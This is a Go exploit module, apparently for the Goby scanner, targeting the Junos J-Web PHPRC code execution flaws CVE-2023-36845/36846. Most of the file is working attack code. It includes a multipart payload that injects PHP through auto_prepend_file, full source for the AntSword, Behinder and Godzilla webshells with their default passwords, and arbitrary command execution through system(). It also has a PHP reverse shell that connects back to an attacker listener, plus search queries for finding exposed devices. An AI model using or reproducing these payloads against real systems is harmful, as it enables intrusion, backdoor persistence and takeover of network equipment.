package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Junos webauth_operation.php PHPRC Code Execution Vulnerability (CVE-2023-36845/CVE-2023-36846)",
    "Description": "<p>Junos is a reliable, high-performance network operating system from Juniper Networks.</p><p>An attacker can use the J-Web service of the Junos operating system to pass in the PHPRC environment variable, turn on the allow_url_include setting, run the incoming encoded PHP code, and gain control of the entire web server.</p>",
    "Product": "JUNIPer-Web-EQPT-Manager",
    "Homepage": "https://www.juniper.net/",
    "DisclosureDate": "2023-08-25",
    "Author": " m0x0is3ry@foxmail.com",
    "FofaQuery": " title=\"Juniper Web Device Manager\" || banner=\"juniper\" || header=\"juniper\" || body=\"svg4everybody/svg4everybody.js\" || body=\"juniper.net/us/en/legal-notices\" || body=\"nativelogin_login_credentials\"",
    "GobyQuery": " title=\"Juniper Web Device Manager\" || banner=\"juniper\" || header=\"juniper\" || body=\"svg4everybody/svg4everybody.js\" || body=\"juniper.net/us/en/legal-notices\" || body=\"nativelogin_login_credentials\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://supportportal.juniper.net/JSA72300\">https://supportportal.juniper.net/JSA72300</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,phpCode,reverse,cmd",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "antsword,behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "phpCode",
            "type": "input",
            "value": "<?php phpinfo(); ?>",
            "show": "attackType=phpCode"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php phpinfo(); ?>",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "pwd",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "File Upload"
    ],
    "VulType": [
        "Code Execution",
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2023-36845",
        "CVE-2023-36846"
    ],
    "CNNVD": [
        "CNNVD-202308-1554",
        "CNNVD-202308-1557"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Junos webauth_operation.php PHPRC 代码执行漏洞（CVE-2023-36845/CVE-2023-36846）",
            "Product": "JUNIPer-Web-Device-Manager",
            "Description": "<p>Junos 是 Juniper Networks 生产的一款可靠的高性能网络操作系统。<br></p><p>攻击者可利用 Junos 操作系统的 J-Web 服务传入 PHPRC 环境变量，打开 allow_url_include 设置，运行传入的编码后的 PHP 代码，进入控制整个 web 服务器。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://supportportal.juniper.net/JSA72300\" target=\"_blank\">https://supportportal.juniper.net/JSA72300</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "代码执行",
                "文件上传"
            ],
            "Tags": [
                "代码执行",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Junos webauth_operation.php PHPRC Code Execution Vulnerability (CVE-2023-36845/CVE-2023-36846)",
            "Product": "JUNIPer-Web-EQPT-Manager",
            "Description": "<p>Junos is a reliable, high-performance network operating system from Juniper Networks.</p><p>An attacker can use the J-Web service of the Junos operating system to pass in the PHPRC environment variable, turn on the allow_url_include setting, run the incoming encoded PHP code, and gain control of the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://supportportal.juniper.net/JSA72300\" target=\"_blank\">https://supportportal.juniper.net/JSA72300</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution",
                "File Upload"
            ],
            "Tags": [
                "Code Execution",
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-12-12",
    "PocId": "10844"
}`

	sendPayloadb81eed3e := func(hostInfo *httpclient.FixUrl, content string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/webauth_operation.php")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		boundary := goutils.RandomHexString(32)
		cfg.Header.Store("Content-Type", "multipart/form-data; boundary="+boundary)
		postDataIndexPart := `--` + boundary + `
Content-Disposition: form-data; name="allow_url_include"

1
auto_prepend_file="data://text/plain;base64,`
		postDataLastPart := `"

--` + boundary + `
Content-Disposition: form-data; name="PHPRC"

/dev/fd/0
--` + boundary + `--
`
		//第一次发包对base64中的+号进行编码，如果不成功，则发送第二个不编码+号的包
		cfg.Data = strings.ReplaceAll(postDataIndexPart+strings.ReplaceAll(base64.StdEncoding.EncodeToString([]byte(content+"<?php echo(847520456);?>")), "+", "%2b")+postDataLastPart, "\n", "\r\n")
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		} else if resp != nil && strings.Contains(resp.RawBody, `847520456`) {
			resp.RawBody = strings.ReplaceAll(resp.RawBody, `847520456`, "")
			resp.Utf8Html = strings.ReplaceAll(resp.Utf8Html, `847520456`, "")
			return resp, err
		}
		cfg.Data = strings.ReplaceAll(postDataIndexPart+base64.StdEncoding.EncodeToString([]byte(content))+postDataLastPart, "\n", "\r\n")
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	//+strings.ReplaceAll(base64.StdEncoding.EncodeToString([]byte(content)), "+", "%2b")+

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			rsp, _ := sendPayloadb81eed3e(u, `<?php echo `+strconv.Quote(checkStr)+`; ?>`)
			return rsp != nil && strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, `echo `+strconv.Quote(checkStr))
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "webshell" {
				webshell := goutils.B2S(ss.Params["webshell"])
				iniName := goutils.RandomHexString(8) + ".ini"
				filename := goutils.RandomHexString(8) + ".php"
				content := goutils.B2S(ss.Params["content"])
				if webshell == "antsword" {
					content = `<?php eval($_POST['ant']); ?>`
				} else if webshell == "behinder" {
					// 该密钥为连接密码 32 位 md5 值的前 16 位，默认连接密码 rebeyond
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION['k']=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded('openssl')){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if(isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if(isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if(strpos($payload,"getBasicsInfo")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if(strpos($data,"getBasicsInfo")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}?>`
				}
				content = "<?php file_put_contents(\"/var/tmp/" + filename + "\", base64_decode(\"" + base64.StdEncoding.EncodeToString([]byte(content+"<!--")) + "\")); ?>"
				_, err := sendPayloadb81eed3e(expResult.HostInfo, content) // 写php文件  .php
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				content = "<?php file_put_contents(\"/var/tmp/" + iniName + "\", base64_decode(\"" + base64.StdEncoding.EncodeToString([]byte("auto_prepend_file=/var/tmp/"+filename)) + "\")); ?>"
				_, err = sendPayloadb81eed3e(expResult.HostInfo, content) // 写配置文件 .ini
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				phpFileResponse, err := sendPayloadb81eed3e(expResult.HostInfo, `<?php  echo(file_get_contents("/var/tmp/`+filename+`")); ?>`) //第一次读php文件 ，读php
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if phpFileResponse != nil && (strings.Contains(phpFileResponse.RawBody, `failed to open stream`) || strings.Contains(phpFileResponse.RawBody, `No such file or directory`)) {
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				iniFileResponse, err := sendPayloadb81eed3e(expResult.HostInfo, `<?php  echo(file_get_contents("/var/tmp/`+iniName+`")); ?>`) //第二次读配置文件 ，读ini
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				} else if iniFileResponse != nil && (strings.Contains(iniFileResponse.RawBody, `failed to open stream`) || strings.Contains(iniFileResponse.RawBody, `No such file or directory`)) {
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/webauth_operation.php?PHPRC=/var/tmp/" + iniName + "\n"
				if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				} else if webshell == "antsword" {
					expResult.Output += "Password: ant\n"
					expResult.Output += "WebShell tool: Antsword v4.0.3\n"
				}
				expResult.Output += "Webshell type: php"
			} else if attackType == "phpCode" || attackType == "cmd" {
				cmd := goutils.B2S(ss.Params["phpCode"])
				checkStr := goutils.RandomHexString(8)
				if attackType == "cmd"{
					cmd = `<?php system('`+goutils.B2S(ss.Params["cmd"])+`'); ?>`
				}
				rsp, err := sendPayloadb81eed3e(expResult.HostInfo, `<?php echo `+strconv.Quote(checkStr)+`; ?>`+cmd+`<?php echo("09385329087"); ?>`)
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(rsp.RawBody, checkStr) {
					expResult.Success = true
					expResult.Output = rsp.RawBody[strings.Index(rsp.RawBody, checkStr)+8 : strings.Index(rsp.RawBody, "09385329087")]
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				addr := godclient.GetGodServerHost()
				ip := net.ParseIP(addr)
				if ip != nil {
					addr = ip.String()
				} else {
					ips, err := net.LookupIP(addr)
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
					}
					addr = ips[0].String()
				}
				go sendPayloadb81eed3e(expResult.HostInfo, "<?php $sock=fsockopen('"+addr+"',"+rp+");$descriptorspec=array(0=>$sock,1=>$sock,2=>$sock);$process=proc_open('/bin/sh',$descriptorspec,$pipes);proc_close($process); ?>")
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
